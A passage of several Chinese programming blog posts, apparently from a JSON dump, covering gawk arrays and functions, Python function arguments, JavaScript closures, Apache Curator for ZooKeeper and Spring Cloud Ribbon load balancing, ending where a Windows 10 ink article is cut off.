\ndata11,data12,data13,data14\ndata21,data22,data23,data24\ndata31,data32,data33,data34\ndata41,data42,data43,data44\ndata51,data52,data53,data54\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat script10\nBEGIN{\nFS=\",\"\n}\n{\ncount=split($0,test)\nfor (i in test)\n{\n         print \"Index:\", i, \"-Value:\",test[i]\n}\nprint \"count =\",count\n#print test[1], test[5]\n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f script10 data1\n\n \n将每一行用FS字符（,）分开，放到了test数组上。再打印数组的数据。\ncount表示字段总数\n22.6.3 时间函数\n\n\n\n\n函数\n\n\n描述\n\n\n\n\nmktime(datadpace)\n\n\n将一个按YYYYMMDDHHMMSS[DST]格式指定的日期转成时间戳值\n\n\n\n\nstrftime(format [,timestamp])\n\n\n将当前时间的时间戳或timestamp（若提供的话）转化格式化日期（采用shell函数data()的格式）\n\n\n\n\nsystime()\n\n\n返回当前时间的时间戳\n\n\n\n\n \n例子：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat script11\nBEGIN{\ndate=systime()\nday=strftime(\"%A, %B %d, %Y\",date)\nprint day\n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f script11\n星期六, 十一月 25, 2017\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n 注意：BEGIN后面的{要挨着BEGIN写，不能换行写。\n否则报错\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f script11\ngawk: script11:2: BEGIN 块必须有一个行为部分\n22.7 自定义函数\n22.7.1 定义函数\n必须要用function关键字，格式如下：\nfunction name([variables])\n{\n  statement\n}\n函数名必须能够统一标识函数。可以在调用的gawk程序中传给这个函数一个或多个变量\n \n例子：\n// 打印记录中的第三个字段\nfunction printthird()\n{\n  print $3\n}\n \n还可以用return返回值。\n例子：\nfunction myrand(limit)\n{\n  return int(limit * rand())\n}\n用法：\nx=myrand(100)\n \n22.7.2 使用自定义函数\n定义函数时，它必须出现在所有代码块之前（包括BEGIN代码块）。\n实例：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat data3\nkobe bryant\n24 Los Lakers\nLos, road34\n99038\n \nPaul Gaoso\n15 los Lakers\nLos, road 38\n23123\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat fun1\nfunction myprint()\n{\n         print \"This is myprint() +++\"\n         printf \"%-16s - %s\\n\", $1,$4\n}\nBEGIN{\nFS=\"\\n\"\nRS=\"\"\n}\n{\nmyprint()\n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f fun1 data3\nThis is myprint() +++\nkobe bryant      - 99038\nThis is myprint() +++\nPaul Gaoso       - 23123\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n先格式化记录中的第一个和第四个数据字段。再输出\n定义了函数就可以在程序的代码中随便使用了\n \n22.7.3 创建函数库\n可以将多个函数放到一个库文件中，这样就能在所有的gawk程序中使用了。\n步骤：\n1）先创建一个存储所有gawk函数的文件\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat funlib \nfunction mylib()\n{\n         print \"mylib() +++\"\n}\nfunction myprint()\n{\n         printf \"%-16s - %s\\n\",$1,$4\n}\nfunction myrand(limit)\n{\n         return int(limit * rand())\n}\nfunction printthird()\n{\n         print $3\n}\n\n2）就可以在脚本中使用啦\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat usefunlib \nBEGIN{\nFS=\"\\n\"\nRS=\"\"\n}\n{\nmyprint()\n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f funlib -f usefunlib data3\nkobe bryant      - 99038\nPaul Gaoso       - 23123\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n要引用文件需要使用-f参数。可以在同一命令行中使用多个-f参数。\n \n22.8 实例\n假设有一个数据文件，里面有两支队伍每队2个人，每人3次的比赛成绩。要求总成绩和平均成绩：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat scores.txt \nRich Blum,team1,100,115,99\nBar Blum,team1,110,118,114\nChr Bre,team2,120,80,90\nTim Bre,team2,125,70,60\n\n \n下面是脚本：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat bowling.sh\n#!/bin/bash\nfor team in $(gawk -F, '{print $2}' scores.txt | uniq)\ndo\n#       echo \"team: $team\"\n         gawk -v team=$team 'BEGIN{FS=\",\";total=0}\n         {\n#                print \"step1+++\"\n                   if ($2==team)\n                   {\n                            total += $3 + $4 + $5;\n                   }\n         }\n         END{\n                   avg = total / 6;\n                   print \"Total for\",team,\"is\",total,\"The avgarge is\",avg\n         }' scores.txt\ndone\n\n脚本分析：\n1）注意uniq这个关键字，这里可以排除一样的。for语句是用来筛选队名的。\n2）for循环里面，假如队名是team1，那么就先处理team1。会读取所有记录，将队名都为team1的记录的$3 $4 $5相加，就是总成绩了。最后求平均值\n \n这里是运行情况：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ ./bowling.sh \nTotal for team1 is 656 The avgarge is 109.333\nTotal for team2 is 545 The avgarge is 90.8333\n"},{"title":"Python测试开发之函数","body":"对于初学者而言，感觉函数还是不是很好理解，尤其是当写一个脚本，或者是写一个算法，认为可能for循环就已经可以解决的问题为什么还要用函数来实现呢？\n今天就来说一下函数的优点，其实函数的最大优点就是可重用，一个函数实现后可以被其他不同的脚本来调用，这也就是体现了代码的重用性。\n\n函数的定义：def 函数名():，在定义函数时，一定要用关键字def开头，然后紧接着是函数名，括号里是要传的的参数，当然也可不传，最后面是个冒号：\n\n　　　　def add(x,y):\n　　　　    return x+y\n　　这就是一个最简单的函数\n　　2.函数的返回值：Python中自定义的函数如果有return，则返回实际的结果，如果没有返回值，则返回None，这是Python与其他语言的区别之一\n　　3.函数的调用：在定义好一个函数后，如果要实现函数的功能，一定要对其进行引用，不然函数体是不会被执行的，调用的方法也很简单，就是函数名和需要的参数即可\n　　例如上边add函数的调用： add(2,3)即可返回5\n　　\n　　注意：此处如果传入两个字符串也是OK的，这也是Python的特殊之处，他会根据传入的值来进行相应操作，如果传入的是两个数字，则进行相加，如果是两个字符串则进行拼接，但是此处必须传入的类型一致，否则会报错，所以可以根据你的需要进行处理，如果要做特定的实现可以用isinstance来判断一下类型，来达到自己想要的效果。\n　　\n　　\n　　4.函数的传参：函数的参数分为按值传递和按地址传递。按值传递是将不可变的参数传递给函数，按地址传递是将可变的参数传递给函数。此处的可变参数与不可变参数是相对内存地址而言的，如果传入的是字符串、元祖、数字，是不可变对象，就是按值传递，为什么说是不可变的，例如如果将a=1这样一个变量传递给函数，那么就是说将1的内存地址传给函数，那么计算机给1分配过内存地址后就不会在变化，所以说在函数体内对a做的任何操作都不会影响函数体外a的值，来看一个例子就会比较好理解了：\na =1\ndef print_sth(s):    s=s+1    return s\nprint print_sth(a)print a  \n　　执行结果：\n　　\n　　下面我们来看一下原理：\n　　这就是按值传递的原理，当函数体内对a进行加1操作，实际是指向另一个内存地址了，用id()就可以查看内存地址\n　　5.看了按值传递的原理，按引用传递应该就好理解了，按引用传递就是传递一些可变参数，例如list、dict等，先来看一下他们的内存地址的变化：\n　　\n　　可以看到当你在对一个list进行操作时，它指向的内存地址实际是没有变化的，所以说当传递可变参数时，函数体内对变量的操作是会影响函数体外的变量的，看一个例子就更明白了：\n　　\n　　现在对函数的按值传递和按引用传递参数应该非常了解了吧。\n　　6.可变参数的表示：*args表示传入的是一个元祖，**args表示传入的是一个字典，在实际使用中当不确定要传入多少个参数时，就可以使用这种方法：\n　　def func(a,*args):\n　　　　for i in args:\n　　　　　　a +=i\n　　　　return a\n　　\n　　你会发现，你传递几个参数都不会出问题，这就是可变参数的好处，然后看一下**args吧：\n　　\n \n　　看完这些，你是否对函数有了很大理解，现在应该感觉函数可以实现很多你想要实现的功能吧，这可不仅仅是几个for循环就能实现的哦，赶快学学函数吧，这也是后面写好代码的基础。\n \n \n　　\n "},{"title":"JavaScript--我发现，原来你是这样的JS：函数表达式和闭包","body":"一、介绍\n\n本次博客主要介绍函数表达式的内容，主要是闭包。\n\n二、函数表达式\n\n定义函数的两种方式：一个是函数声明，另一个就是函数表达式。\n\n\n//1.函数声明写法\nfunction fn2(){\n    console.log('函数声明');  \n}\n//2.函数表达式写法\nvar fn1 = function(){\n    console.log('函数表达式');\n}\n区别：\n1.函数声明是用function后面有函数名，函数表达式是赋值形式给一个变量。\n2.函数声明可以提升函数，而函数表达式不会提升\n函数提升就是函数会被自动提升到最前方，以至于再调用函数后再声明函数也不会有错：\n//例子：\n//先调用运行\nsayName();\n//再声明函数\nfunction sayName(){\n    console.log('ry');\n}\n\n//运行结果\n'ry'\n函数表达式就不会被提升：\n//先调用\nsayBye();\n//函数表达式\nvar sayBye = function(){\n    console.log('bye bye');\n}\n\n//运行报错\n但是下面的写法很危险：因为存在函数声明的提升\n//书上代码\nif(condition){\n    function sayHi(){\n        console.log('hi');\n    }\n}\nelse{\n    function sayHi(){\n        console.log('yo');\n    }\n}\n解说一下： 这段代码想表达在condition为true时声明sayHi，不然就另一函数sayHi，但是运行结果往往出乎意料，在当前chrome或firefox可能能做到，但是在IE10以下的浏览器（我测试过）往往不会遵循你的意愿，不管condition是true还是false都会输出yo。\n这时函数表达式能派上用场了：\n//换成函数表达式，没问题因为不会被提升，只有当执行时才赋值\nvar sayHi = null;\nif(condition){\n    sayHi = function (){\n        console.log('hi');\n    }\n}\nelse{\n    sayHi = function sayHi(){\n        console.log('yo');\n    }\n}\n三、闭包\n\n闭包的定义：有权访问另一个函数作用域中的变量的函数\n\n有人觉得闭包很难理解，一开始我也是这样的，我认为那是对一些概念还不够了解。\n定义中说明了什么是闭包，最常见的形式就是在函数中再声明一个函数。\n重点理解这里：\n1.闭包能访问外围函数的变量是因为其作用域链中有外围函数的活动对象（这个活动对象即使在外围函数执行完还会存在，不会被销毁，因为被闭包引用着）。\n2.闭包是函数中的函数，也就是说其被调用时也创建执行上下文，对于执行上下文这部分可以看看这篇：深入理解js执行--创建执行上下文这篇博客。\n理解了上面之后我们再来看闭包的例子：\nfunction a(){\n    //a函数的变量\n    var val_a = \"我是a函数里的变量\";\n    //声明函数b，b能访问函数a的变量\n    function b(){\n        console.log(val_a);\n    }\n    //a函数将b返回\n    return b;\n}\n\n//全局变量fn，a执行返回了b给fn\nvar fn = a();\n//调用fn，能够在全局作用域访问a函数里的变量\nfn();  //我是a函数里的变量\n\n这里fn能够访问到a的变量，因为b中引用着a的活动对象，所以即使a函数执行完了，a的活动对象还是不会被销毁的。这也说明过度使用闭包会导致内存泄漏。\n\n再来个常见的例子（给多个li添加点击事件，返回对于li的下标）：\n<body>\n    <ul id=\"list\">\n        <li>red</li>\n        <li>green</li>\n        <li>yellow</li>\n        <li>black</li>\n        <li>blue</li>\n    </ul>\n</body>\n//获得li标签组\nvar li_group = document.getElementsByTagName('li');\n\n//错误例子:每个li都会跳出5\nfunction fn(){\n    //为每一个li添加点击事件\n    var i = 0;\n    //使用for来给每个li添加事件\n    for(;i<li_group.length;i++){\n        //添加点击事件\n        li_group[i].addEventListener('click',function(){\n            // 输出对应得下标\n            console.log(i);\n        });\n    }\n}\nfn();\n\n\n//正确的例子：\n//在加一层的函数，作为闭包，用来保存每一次循环的i变量，就可以达到目的\nfunction correctFn(){\n    var i = 0;\n    for(;i<li_group.length;i++){\n        //在外面套一层函数，这层函数会保存每次循环的i变量，也就是闭包了。\n        (function(num){\n            li_group[num].addEventListener('click',function(){\n                console.log(num);\n            });               \n        }(i));        \n    }\n}\ncorrectFn();\n看下面解释之前我默认你已经知道活动对象是什么了，如果不懂可以看这篇：深入理解js执行--创建执行上下文\n解释一下：\n1.错误的例子:\n屡一下思路，每个li都有click执行的函数，每个函数点击后才会执行是吧，那每个click的函数的外层函数是fn这个函数，那这5个click函数都会保存着fn的活动对象，那这个输出的i变量在fn这函数里面，所以当fn执行完后，i的值是5了，因此当每个里触发click的函数的时候输出的也就是5了。\n再简单的说：每个li的click事件触发的函数引用的i在同一个活动对象中，所以值都一样。\n2.正确执行的例子：\n我们就在外层加了一层匿名函数并立即执行(虽然函数被执行了，如果有函数引用着它的活动对象，那其活动对象将不灭)，这时每个li的click函数外层函数是每次循环产生的不同的匿名函数，这匿名也是有活动对象，每个li的click的函数保存着各自的匿名函数的活动对象，num这变量也根据每次循环产生不同的匿名函数传入的i的不同而不同，所以能够输出对应不同的值。\n\n上面说的可能有点啰嗦，请原谅我[捂脸.jpg]，我是希望尽可能的表达清楚。如果你看懂了，那对闭包的理解也更深一层了哦。\n\n小结：\n\n1.本篇主要讲的是闭包，闭包是有权访问另一个函数作用域中的变量的函数，主要是函数中的函数，因为能引用外层函数的活动对象所以能够访问其外层的变量。\n2.我本篇主要讲的是原理，如果对一些东西不懂，可以看下面几篇。\n\n\n相关的几篇：\n深入理解js执行--单线程的JS\n深入学习JS执行--创建执行上下文（变量对象，作用域链，this）\n我发现，原来你是这样的JS全部文章汇总（点击此处）\n\n\n本文出自博客园：http://www.cnblogs.com/Ry-yuan/\n作者：Ry（渊源远愿）\n欢迎访问我的个人首页：我的首页\n欢迎访问我的github:https://github.com/Ry-yuan/demoFiles\n欢迎转载，转载请标明出处，保留该字段。\n\n"},{"title":"15. 使用Apache Curator管理ZooKeeper","body":"Apache ZooKeeper是为了帮助解决复杂问题的软件工具，它可以帮助用户从复杂的实现中解救出来。 然而，ZooKeeper只暴露了原语，这取决于用户如何使用这些原语来解决应用程序中的协调问题。 社区已经在ZooKeeper数据模型及其API之上开发了高级框架。 Apache Curator是一个高级的包装类库和框架，使得ZooKeeper非常简单易用。\n\nTips\nCurator最初由Netflix开发，现在是一个Apache项目。 项目页面位于http://curator.apache.org/。\n\n一 Curator组件\nCurator是ZooKeeper的高级类库；它使处理ZooKeeper变得更容易，并扩展了核心ZooKeeper的功能。 Curator在高层次上由以下部分组成：\n\nClient：Curator客户端是ZooKeeper的Java客户端的一个包装器。 它是Curator堆栈中的一个低级API，并且抽象出ZooKeeper客户端的功能。\nFramework：Curator框架是一个具有高级功能的高级API，如自动连接管理，操作重试等等。 它在很大程度上简化了ZooKeeper的使用。\nRecipe：Curator Recipe提供ZooKeeper Recipe的实现； 这些实现可以直接用于分布式应用程序来解决协调问题。\nExtensions：Curator Recipe包实现了常见的Recipe。 为了避免这个包的膨胀，使用一个单独的扩展包。\n\n除了前面的组件外，Curator还附带一些ZooKeeper有用的工具。 Curator堆栈如下图所示：\n\nCurator JARs可以在Maven Central的仓库中找到。 Curator可以很容易地包含在Maven，Gradle，Ivy，SBT等构建脚本中。\n各种Maven artifacts在http://mvnrepository.com/artifact/org.apache.curator上列出。\n二 Curator客户端\nCurator Client是ZooKeeper Java客户端的一个包装器。它使客户端访问ZooKeeper更简单，更不易出错。\nCurator客户端提供以下功能：\n\n连接管理：管理与ZooKeeper服务器的连接\n操作重试实用程序：这是重试操作的机制\n测试ZooKeeper服务器：这是用于测试ZooKeeper服务器\n\n使用Curator客户端连接ZooKeeper服务器的MyCuratorClient.java的代码片段如下：\npublic void myCuratorClient() throws Exception\n{\n  CuratorZookeeperClient client = new CuratorZookeeperClient(server.getConnectString(), 10000, 10000, null,new RetryOneTime(1));\n  client.start();\n  try\n  {\n    client.blockUntilConnectedOrTimedOut();\n    String path = client.getZooKeeper().create(\"/test_znode\", \"\".getBytes(),ZooDefs.Ids.OPEN_ACL_UNSAFE, CreateMode.PERSISTENT);\n  }\n  finally\n  {\n    client.close();\n  }\n}\nCuratorZooKeeperClient构造方法用于连接到ZooKeeper服务器。 它需要连接字符串或ZooKeeper主机端口对列表，会话和连接超时时间，可选的观察器对象以及要使用的重试策略。 重试策略是客户端在重试连接时尝试各种重试机制的机制。在前面的例子中，使用了一个客户端只会重试一次的策略。\nCurator客户端支持以下重试策略：\n\nBoundedExponentialBackoffRetry：通过增加重试之间的休眠时间直到最大上限重试指定的次数\nExponentialBackoffRetry：通过增加重试之间的休眠时间来重试指定的次数\nRetryNTimes：重试n次\nRetryOneTime：只重试一次\nRetryUntilElapsed：一直重试，直到超过指定时间\n\n一旦客户端启动，blockUntilConnectedOrTimedOut方法直到ZooKeeper连接服务器成功或者连接超时。连接成功之后，创建/testznode的znode。getZooKeeper()方法将连接的实例返回给托管的ZooKeeper服务器。\n\nNote\nCurator API文档可在http://curator.apache.org/apidocs/index.html察看。\n\nCurator客户端是一个低层次的API，它提供了对管理员客户端API的抽象。开发人员应该使用Curator框架，而不是直接在他们的应用程序中使用CuratorZookeeperClient类作为最佳实践。\n三 Curator框架\nCurator框架（org.apache.curator.framework）是一个高层次的API，很大程度上简化了ZooKeeper的使用。 它提供的一些功能如下：\n\n自动连接管理：此功能自动且透明地处理客户端需要重新建立与ZooKeeper服务器的连接和/或重试操作的场景。\n简单而灵活的API：使用一组新式且流畅的接口来应用ZooKeeper原始的API。\nRecipe：这个功能实现了常见的ZooKeeper Recipe。\n\nCuratorFramework使用CuratorFrameworkFactory进行分配。 它提供了工厂方法以及构造器创建实例。CuratorFramework实例完全是线程安全的。在使用CuratorFramework开发应用程序时，开发人员应该为每个ZooKeeper集群创建和共享一个CuratorFramework实例。CuratorFramework使用fluent风格接口。\n以下展示的是ZooKeeper客户端使用CuratorFramework的代码示例：\npublic void myCuratorFrameworkClient()\nthrows Exception\n{\n  CuratorFramework client =\n  CuratorFrameworkFactory.newClient(server.getConnectString(), new RetryOneTime(1));\n  client.start();\n  try\n  {\n    String path = client.create().withMode(\n    CreateMode.PERSISTENT).forPath(\n    \"/test_znode\", \"\".getBytes());\n  }\n  finally\n  {\n    client.close();\n  }\n}\nnewClient()工厂方法创建一个新的客户端实例，默认会话超时和默认连接超时。 它需要一个连接字符串，是ZooKeeper主机-端口对列表和要使用的重试策略。\nCuratorFramework有一个命名空间的概念。 通过这个，可以在使用构造器方法创建CuratorFramework实例时设置命名空间。 当其中一个API被调用时，该框架将该命名空间预加载到所有路径：\nCuratorFrameworkFactory.Builder builder = CuratorFrameworkFactory.builder();\nCuratorFramework client = builder.connectString (server.getConnectString()).namespace(\"MyApp\").retryPolicy(new RetryOneTime(1)).build();\nclient.create().forPath(\"/test_znode\", data);\n在这里，尽管znode的名称被指定为/test_znode，但是创建的实际znode是/MyApp/test_znode。\nCurator框架还提供了一个名为CuratorTempFramework的有限功能框架接口，用于通过不可靠的网络（如WAN）进行临时连接。 在这个框架中，如果会话保持空闲一段时间，ZooKeeper连接将被关闭。\n四 Curator recipe\nCurator为ZooKeeper提供了一系列随时可用的recipe。 Curator实现的recipe的详细列表和描述可以从http://curator.apache.org/curator-recipes/index.html的项目页面中获取。\n在这里，将简略地介绍一下ZooKeeper的recipe：\n\n领导者选举：Curator为领导选举提供了两种算法：领导者锁定（leader latch）和领导者选择（ leader selector）。两种算法在连接到Zookeeper集群的多个竞争者中选择一个“领导者”。\n在领导者锁定中，如果一组n个参与者与竞争领导，则将n个参与者中的一个随机分配为领导，而在领导选择中，按照到达该Zookeeper服务器的请求的顺序来选择领导。 当领导者解除领导时，选择集群中的n个参与者的另一个竞争者。\n锁：Curator实现以下不同类型的分布式锁：\n\n共享重入锁：这种类型的锁提供全局同步的全分布锁。\n共享锁：这是非重入共享重入锁。\n共享重入读/写锁：这是一个可跨JVM使用的重入读/写互斥锁。\n共享信号量：这是一个计数信号量（semaphore），可以跨JVM使用。\n多锁共享：这是用来管理多个锁作为一个单一的实体。 acquire()调用获取所有的锁。 如果呼叫失败，所有获得的路径被释放。 release()调用释放所有托管的锁。\n\n屏障（Barrier）：这是屏障和双重屏障的具体实现。\n计数器：提供了一种机制来管理共享计数器的共享整数。它还给出了分布式原子增量的分布式原子长整型，分布式原子整型和分布式原子值的机制。\n缓存：缓存是通过路径缓存，节点缓存和树缓存recipe实现的，分别保存ZK路径的znode，本地缓存节点和所有本地缓存的子节点的状态变化数据。\n队列：这提供了分布式队列实现。 支持以下不同类型的队列：\n\n分布式队列：这是一个简单的分布式队列，其中放入队列中的条目是在FIFO中排序的。\n分布式ID队列：这是一个分布式队列的版本，允许一些标识符与队列项相关联。\n分布式优先级队列:这是ZooKeeper的分布式优先级队列的实现。在内部，它使用一个分布式队列，其中可以将优先级指定给项目。\n分布式延迟队列：这是使用时间作为优先级的分布式优先级队列的变体。当将条目添加到队列时，会给出一个延迟值。直到超过延迟时间，该项目将被发送给消费者。\n简单的分布式队列：这是ZooKeeper分布式org.apache.zookeeper.recipes.queue.DistributedQueue队列的一部分替代实现。\n\n节点：这提供了一个persistent ephemeral节点的recipe；这是一个ephemeral的节点，即使在连接和会话中断的情况下也会试图保持在ZooKeeper中。\n\n五 Curator实用程序\nCurator类库也为ZooKeeper提供了一些有用的工具。 其中一些如下所示：\n\nTest server：这是一个可用于本地进程ZooKeeper服务器的测试\nTest cluster：这是一个内部运行的用于ZooKeeper服务器ensemble的测试\nZKPaths：提供了各种使用ZooKeeper znode路径的静态方法\nEnsurePath：确保在使用之前创建特定znode路径的实用程序\nBlockingQueueConsumer：一个类似于Java中的BlockingQueue的队列消费者\nReaper：删除没有子节点的路径和没有数据的节点的实用程序\n\n六 Curator扩展\nCurator扩展包除了包含在recipe包中那些外，还包括额外的recipe。 扩展包中的recipe具有curator-x-name的命名约定。\nCurator目前提供以下扩展功能：\n\nService discovery：这是一个使用ZooKeeper作为服务发现机制的系统。\nService discovery server：这是一个使用REST服务进行非Java和遗留程序的Curator服务发现。 它公开RESTful Web服务来注册，删除和查询服务。\nCurator RPC proxy：该模块实现了一个代理，将非Java环境与Curator框架和recipe桥接在一起。 它使用Apache Thrift，使大量的语言和环境使用Curator的功能，并统一ZooKeeper跨语言/环境的用法。\nZKClient bridge：这个扩展是Curator和ZKClient之间的桥梁（https://github.com/sgroschupf/zkclient）。 使用ZKClient编写的应用程序在不改变现有代码的情况下使用Curator类库会非常有用。 ZKClient bridge不作为Curator分发的一部分进行打包。 它可以在它自己的Maven中心存储库中的curator-x-zkclient-bridge中找到。\n\n到目前为止，我们已经了解Curator类库及其各种组件。Curator为ZooKeeper API实现了一个非常好的，可靠的扩展，将ZooKeeper的许多复杂性抽象出来。 强烈建议开发人员使用Curator在Java语言的ZooKeeper开发分布式应用程序。 不仅如此，Curator的强大功能也可以从Java以外的语言编写的应用程序中使用。\n"},{"title":"【微服务】之四：轻松搞定SpringCloud微服务-负载均衡Ribbon","body":"\n对于任何一个高可用高负载的系统来说，负载均衡是一个必不可少的名称。在大型分布式计算体系中，某个服务在单例的情况下，很难应对各种突发情况。因此，负载均衡是为了让系统在性能出现瓶颈或者其中一些出现状态下可以进行分发业务量的解决方案。在SpringCloud 体系当中，加入了Netflix公司的很多优秀产品，其中一个就是针对于服务端进行负载均衡的Ribbon。\n\n本系列博文目录\n【微服务】之三：轻松搞定SpringCloud微服务目录\n本系列为连载文章，阅读本文之前强烈建议您先阅读前面几篇。\n相关简介\n负载均衡简介\n负载均衡：英文名称为Load Balance， 建立在现有网络结构之上，它提供了一种廉价有效透明的方法扩展网络设备和服务器的带宽、增加吞吐量、加强网络数据处理能力、提高网络的灵活性和可用性。其意思就是分摊到多个操作单元上进行执行，例如Web服务器、FTP服务器、企业关键应用服务器和其它关键任务服务器等，从而共同完成工作任务。\n负载均衡带来的好处很明显：\nRibbon简介\nRibbon是Netflix开源的一款用于客户端软负载均衡的工具软件。Spring Cloud对Ribbon进行了一些封装以更好的使用Spring Boot的自动化配置理念。\nSpring Cloud Ribbon 简介\nSpring Cloud Ribbon是基于Netflix Ribbon实现的一套客户端负载均衡的工具。它是一个基于HTTP和TCP的客户端负载均衡器。它可以通过在客户端中配置ribbonServerList来设置服务端列表去轮询访问以达到均衡负载的作用。\n开始起飞\n起飞之前，先说明一下，本项目前几篇文章中已经构建了相关子项目包括：注册中心、配置中心。本文中继续可以使用。\n创建两个服务器\n需要创建两个一模一样的服务器，让客户端按照不同的机制进行分发，达到负载均衡的效果。我们约定两个子项目名称：\ncloud-hyh-service-1 端口号：8071\ncloud-hyh-service-2 端口号：8072\n对于服务名称设置一样：cloud-service ，其他业务都一样，可以复制。【端口号不一样】\npom.xml文件配置\n<dependencies>\n    <dependency>\n        <groupId>org.springframework.cloud</groupId>\n        <artifactId>spring-cloud-starter-eureka</artifactId>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-web</artifactId>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-test</artifactId>\n        <scope>test</scope>\n    </dependency>\n</dependencies>\n<build>\n    <plugins>\n        <plugin>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-maven-plugin</artifactId>\n        </plugin>\n    </plugins>\n</build>\n服务器一参数配置\n#服务注册中心配置\neureka:\n  client:\n    service-url:\n      defaultZone: http://localhost:8081/eureka/\n  instance:\n    appname: cloud-service\n    lease-renewal-interval-in-seconds: 1\n\nserver:\n  port: 8071\n\nspring:\n  application:\n    name: cloud-service\n\n服务器二参数配置\n#服务注册中心配置\neureka:\n  client:\n    service-url:\n      defaultZone: http://localhost:8081/eureka/\n  instance:\n    appname: cloud-service\n\nserver:\n  port: 8072\n\nspring:\n  application:\n    name: cloud-service\n说明：与配置一其实基本一样，只不过将端口号配置成 8072\n服务器入口配置Application.yml\n/**\n * @Description : \n * @Author hanyahong\n * @Date 2017/12/7- 17:35\n */\n@SpringBootApplication\n@EnableDiscoveryClient\npublic class ServiceTwoApplication {\n    public static void main(String[] args) {\n        SpringApplication.run(ServiceTwoApplication.class, args);\n    }\n}\n新建测试API类\n/**\n * @Description :测试RibbonTest API\n * @Author hanyahong\n * @Date 2017/12/7- 17:40\n */\n@RestController\n@RequestMapping(value = \"/ribbon\")\npublic class RibbonTestApi {\n\n    /**\n     * 获取博客名称API\n     *\n     * @return 相关信息\n     */\n    @RequestMapping(value = \"name\", method = RequestMethod.GET)\n    public String getMyBlogNameApi() {\n        return \"千万之路刚开始-www.hanyahong.com-beijing\"+\"该服务器端口号：8071\";\n    }\n}\n\n\n备注：两台服务器，除了返回的服务器端口号 8071 8072不同之外，其他都相同，就是为了看到效果。\n创建测试客户端\n创建一个子项目，cloud-hyh-ribbon-client ,主要用来测试ribbon客户端负载。\npom文件配置\n在pom文件中加入以下依赖：\n<dependencies>\n    <dependency>\n        <groupId>org.springframework.cloud</groupId>\n        <artifactId>spring-cloud-starter-eureka</artifactId>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-web</artifactId>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-test</artifactId>\n        <scope>test</scope>\n    </dependency>\n</dependencies>\n<build>\n     <plugins>\n         <plugin>\n             <groupId>org.springframework.boot</groupId>\n             <artifactId>spring-boot-maven-plugin</artifactId>\n         </plugin>\n     </plugins>\n </build>\n配置文件application配置\neureka:\n  client:\n    service-url:\n      defaultZone: http://localhost:8081/eureka/\n  instance:\n    appname: ribbon-client\n\nserver:\n  port: 8092\n\nspring:\n  application:\n    name: ribbon-client\n配置子项目启动类\n/**\n * @Description :启动类，示范负载均衡服务器\n * @Author hanyahong\n * @Date 2017/12/7- 17:00\n */\n@SpringBootApplication\n@EnableDiscoveryClient\npublic class RibbonServiceApplication {\n\n    public static void main(String[] args) {\n\n        SpringApplication.run(RibbonServiceApplication.class, args);\n    }\n\n    /**\n     * Spring提供的用于访问Rest服务的客户端\n     * @return\n     */\n    @Bean\n    @LoadBalanced\n    RestTemplate restTemplate() {\n        return new RestTemplate();\n    }\n}\n说明：\n\nRestTemplate是Spring提供的用于访问Rest服务的客户端。RestTemplate提供了多种便捷访问远程Http服务的方法，能够大大提高客户端的编写效率。调用RestTemplate的默认构造函数，RestTemplate对象在底层通过使用java.net包下的实现创建HTTP 请求，可以通过使用ClientHttpRequestFactory指定不同的HTTP请求方式。\nClientHttpRequestFactory接口主要提供了两种实现方式，一种是SimpleClientHttpRequestFactory，使用J2SE提供的方式（既java.net包提供的方式）创建底层的Http请求连接，还有一种方式是使用HttpComponentsClientHttpRequestFactory方式，底层使用HttpClient访问远程的Http服务，使用HttpClient可以配置连接池和证书等信息。\n\n**@LoadBalanced** 注解加在RestTemplate上面，这个注解会自动构造LoadBalancerClient接口的实现类并注册到Spring容器中。\n创建接口API\n/**\n * @Description : 测试客户端负载均衡的接口API\n * @Author hanyahong\n * @Date 2017/12/7- 18:01\n */\n@RestController\n@RequestMapping(value = \"/test\")\npublic class TestRibbonApi {\n    /**\n     * 注入RestTemplate\n     */\n    @Autowired\n    RestTemplate restTemplate;\n\n\n    @RequestMapping(value = \"/blog/name\" ,method = RequestMethod.GET)\n    public String testGetNameOfBlog(){\n        String url=\"http://CLOUD-SERVICE/ribbon/name\";\n        return restTemplate.getForObject(url,String.class);\n    }\n}\n注意：这个代码中 url 设置的是 上面提到的服务器的服务名。\n启动项目群进行测试\n经过全面的配置，服务器全面配置完毕，包括一个注册中心、一个配置中心、两个相同配置的服务器、一台测试客户端负载均衡的测试服务器。\n启动成功以后会在注册中心看到。\n\n通过访问客户端地址：http://localhost:8092/test/name 就可以访问。效果如下：\n\n刷新一次：\n\n至此所有配置成功。测试结果也成功。\n本文源码\nGithub源码：https://github.com/hanyahong/spring-cloud-microservice\n"},{"title":"【Win 10 应用开发】将墨迹保存到图像的两种方法","body":"IT界最近这几年，各种乱七八糟的东西不断出现，其中能用在实际工作与生活中的，大概也就那么几个。Web 前端也冒出各种框架，这就为那些喜欢乱用框架的公司提供了很好的机会，于是造成很多项目体积越来越庞大，越来越难维护。一切变得越来越没有标准，所以，很多公司在招聘码农时就特能乱写，还要求你精通 